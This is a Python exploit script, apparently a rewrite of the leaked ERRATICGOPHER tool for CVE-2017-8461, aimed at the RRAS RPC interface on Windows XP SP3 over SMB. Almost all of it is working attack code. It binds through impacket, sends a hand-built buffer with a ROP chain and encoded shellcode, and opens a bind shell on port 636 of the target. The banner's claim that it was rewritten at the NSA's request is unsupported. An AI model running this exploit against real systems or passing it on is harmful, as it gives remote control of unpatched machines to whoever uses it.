#############################################################################
#                                                                           #
#           NSA's ERRATICGOPHER for Windows XP SP3 // CVE-2017-8461         #
#                                                                           #
#       Stub borrowed from VPORTAL. Thanks to VPORTAL                       #
#                                                                           #
#       Entirely new ROP not included in the original binary                #
#                                                                           #
#       No need for egghunter                                               #
#                                                                           #
#       Eager to see where I can get SMBv1 Technet Specifications           #
#                                                                           #
#       No protocol analysis for this one                                   #
#                                                                           #
#       I love you Tai // @r0ss1n1 Charles Truscott                         #
#                                                                           #
#       Rewritten at request of the National Security Agency                #
#                                                                           #
#       Done just as 2009 Advanced Windows Exploitation's MS08-67           #
############################################################################

import sys
import time
import os

from threading import Thread                             
from impacket import smb
from impacket import uuid
from impacket import dcerpc
from impacket.dcerpc.v5 import transport

print("usage: erraticgopher.py [target]")
target = sys.argv[1]
trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
trans.connect()
dce = trans.DCERPC_class(trans)
#RRAS DCE-RPC CALL
dce.bind(uuid.uuidtup_to_bin(('8f09f000-b7ed-11ce-bbd2-00001a181cad', '0.0')))

# bind shell port 636

shell =  ""
shell += "\xdb\xc7\xbf\x6d\x31\x4f\xcc\xd9\x74\x24\xf4\x5e\x33"
shell += "\xc9\xb1\x53\x83\xc6\x04\x31\x7e\x13\x03\x13\x22\xad"
shell += "\x39\x17\xac\xb3\xc2\xe7\x2d\xd4\x4b\x02\x1c\xd4\x28"
shell += "\x47\x0f\xe4\x3b\x05\xbc\x8f\x6e\xbd\x37\xfd\xa6\xb2"
shell += "\xf0\x48\x91\xfd\x01\xe0\xe1\x9c\x81\xfb\x35\x7e\xbb"
shell += "\x33\x48\x7f\xfc\x2e\xa1\x2d\x55\x24\x14\xc1\xd2\x70"
shell += "\xa5\x6a\xa8\x95\xad\x8f\x79\x97\x9c\x1e\xf1\xce\x3e"
shell += "\xa1\xd6\x7a\x77\xb9\x3b\x46\xc1\x32\x8f\x3c\xd0\x92"
shell += "\xc1\xbd\x7f\xdb\xed\x4f\x81\x1c\xc9\xaf\xf4\x54\x29"
shell += "\x4d\x0f\xa3\x53\x89\x9a\x37\xf3\x5a\x3c\x93\x05\x8e"
shell += "\xdb\x50\x09\x7b\xaf\x3e\x0e\x7a\x7c\x35\x2a\xf7\x83"
shell += "\x99\xba\x43\xa0\x3d\xe6\x10\xc9\x64\x42\xf6\xf6\x76"
shell += "\x2d\xa7\x52\xfd\xc0\xbc\xee\x5c\x8d\x71\xc3\x5e\x4d"
shell += "\x1e\x54\x2d\x7f\x81\xce\xb9\x33\x4a\xc9\x3e\x33\x61"
shell += "\xad\xd0\xca\x8a\xce\xf9\x08\xde\x9e\x91\xb9\x5f\x75"
shell += "\x61\x45\x8a\xe0\x69\xe0\x65\x17\x94\x52\xd6\x97\x36"
shell += "\x3b\x3c\x18\x69\x5b\x3f\xf2\x02\xf4\xc2\xfd\x2e\x79"
shell += "\x4a\x1b\x44\x91\x1a\xb3\xf0\x53\x79\x0c\x67\xab\xab"
shell += "\x24\x0f\xe4\xbd\xf3\x30\xf5\xeb\x53\xa6\x7e\xf8\x67"
shell += "\xd7\x80\xd5\xcf\x80\x17\xa3\x81\xe3\x86\xb4\x8b\x93"
shell += "\x2b\x26\x50\x63\x25\x5b\xcf\x34\x62\xad\x06\xd0\x9e"
shell += "\x94\xb0\xc6\x62\x40\xfa\x42\xb9\xb1\x05\x4b\x4c\x8d"
shell += "\x21\x5b\x88\x0e\x6e\x0f\x44\x59\x38\xf9\x22\x33\x8a"
shell += "\x53\xfd\xe8\x44\x33\x78\xc3\x56\x45\x85\x0e\x21\xa9"
shell += "\x34\xe7\x74\xd6\xf9\x6f\x71\xaf\xe7\x0f\x7e\x7a\xac"
shell += "\x30\x9d\xae\xd9\xd8\x38\x3b\x60\x85\xba\x96\xa7\xb0"
shell += "\x38\x12\x58\x47\x20\x57\x5d\x03\xe6\x84\x2f\x1c\x83"
shell += "\xaa\x9c\x1d\x86"

rop ="\xd4\xc7\x19\x73"
rop +="\xec\x10\x16\x73"
rop +="\x0b\x56\x16\x73"
rop +="\x41\x41\x41\x41"
rop +="\xdf\x19\x16\x73"
rop +="\xf1\x9a\x80\x7c"
rop +="\x51\x5e\x1a\x73"
rop +="\x87\xe5\x1b\x73"
#rop +="\x6b\x13\x1a\x73"
#rop +="\xff\xff\xff\xff"
#rop +="\xe1\x02\x17\x73"
#rop +="\xa9\x16\x16\x73"
rop +="\x7c\x3a\x16\x73"
rop +="\x01\x00\x00\x00"
rop +="\x6b\x13\x1a\x73"
rop +="\xa9\x0f\xf9\x7f"
rop +="\xad\xba\x19\x73"
rop +="\x93\x4e\x1b\x73"
rop +="\x0c\x13\x16\x73"
rop +="\xf1\x9a\x80\x7c"
rop +="\xf1\x9a\x80\x7c"
rop +="\x43\xad\x1a\x73"
rop +="\xc0\xff\xff\xff"
rop +="\xe1\x02\x17\x73"
rop +="\x2f\x3e\x18\x73"
rop +="\x09\x13\x16\x73"
rop +="\x0a\x13\x16\x73"
rop +="\x4f\xa8\x1a\x73"
#rop +="\x90\x90\x90\x90"
rop +="\xf1\x9a\x80\x7c" # 7C809AF1
rop +="\xa8\x1d\x18\x73"
rop +="\xf1\x9a\x80\x7c"
rop +="\x69\x12\x37\x66"*4 #0x66371269 : push esp # ret

stub = "\x21\x00\x00\x00\x10\x27\x00\x00\x30\x07\x00\x00\x00\x40\x51\x06\x04\x00\x00\x00\x00\x85\x57\x01\x30\x07\x00\x00\x08\x00\x00\x00" #Magic bytes
stub += "\x41"*20 + rop + "\x90" * 108 + shell + "\xCC"*(1313-252-len(shell))
stub += "\x12"
stub += "\x46"*522
stub += "\x04\x00\x00\x00\x00\x00\x00\x00"

dce.call(0x1d, stub) 

print("bind shell on port 636")
